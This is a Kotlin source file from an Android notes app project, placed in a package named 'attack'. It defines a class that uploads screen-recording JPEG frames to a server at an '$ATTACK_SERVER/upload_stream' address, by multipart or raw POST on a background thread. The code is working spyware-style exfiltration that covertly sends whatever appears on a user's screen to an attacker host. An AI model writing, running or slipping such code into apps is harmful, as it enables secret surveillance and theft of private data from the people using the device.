package org.fossify.notes.attack

import android.util.Log
import okhttp3.MediaType.Companion.toMediaType
import okhttp3.MultipartBody
import okhttp3.OkHttpClient
import okhttp3.Request
import okhttp3.RequestBody.Companion.asRequestBody
import okhttp3.RequestBody.Companion.toRequestBody
import java.io.File
import java.io.FileOutputStream
import java.util.concurrent.ExecutorService
import java.util.concurrent.Executors
import java.util.concurrent.atomic.AtomicLong

/**
 * 屏幕流上传器
 * 将录屏帧数据推送到服务器
 */
class ScreenStreamUploader(
    private val serverUrl: String = "$ATTACK_SERVER/upload_stream"
) {
    private val client = OkHttpClient()
    private val executor: ExecutorService = Executors.newSingleThreadExecutor()
    private val frameSeq = AtomicLong(0)
    
    companion object {
        private const val TAG = "ScreenStreamUploader"
    }
    
    /**
     * 上传 JPEG 帧数据
     * @param jpegData JPEG 字节数组
     */
    fun uploadFrame(jpegData: ByteArray) {
        executor.execute {
            try {
                frameSeq.incrementAndGet()
                
                // 使用 multipart/form-data 格式上传
                val requestBody = MultipartBody.Builder()
                    .setType(MultipartBody.FORM)
                    .addFormDataPart(
                        "frame",
                        "frame_${frameSeq.get()}.jpg",
                        jpegData.toRequestBody("image/jpeg".toMediaType())
                    )
                    .build()
                
                val request = Request.Builder()
                    .url(serverUrl)
                    .post(requestBody)
                    .build()
                
                val response = client.newCall(request).execute()
                
                if (response.isSuccessful) {
                    val seq = frameSeq.get()
                    if (seq % 30 == 0L) {
                        Log.d(TAG, "已上传 $seq 帧到服务器")
                    }
                } else {
                    Log.w(TAG, "上传帧失败: ${response.code} ${response.message}")
                }
                
                response.close()
            } catch (e: Exception) {
                Log.e(TAG, "上传帧出错: ${e.message}", e)
            }
        }
    }
    
    /**
     * 使用二进制体直接上传（更高效，适用于服务器接受二进制体的情况）
     */
    fun uploadFrameDirect(jpegData: ByteArray) {
        executor.execute {
            try {
                frameSeq.incrementAndGet()
                
                val requestBody = jpegData.toRequestBody("image/jpeg".toMediaType())
                
                val request = Request.Builder()
                    .url(serverUrl)
                    .post(requestBody)
                    .build()
                
                val response = client.newCall(request).execute()
                
                if (response.isSuccessful) {
                    val seq = frameSeq.get()
                    if (seq % 30 == 0L) {
                        Log.d(TAG, "已上传 $seq 帧到服务器")
                    }
                } else {
                    Log.w(TAG, "上传帧失败: ${response.code} ${response.message}")
                }
                
                response.close()
            } catch (e: Exception) {
                Log.e(TAG, "上传帧出错: ${e.message}", e)
            }
        }
    }
    
    /**
     * 释放资源
     */
    fun release() {
        executor.shutdown()
    }
}

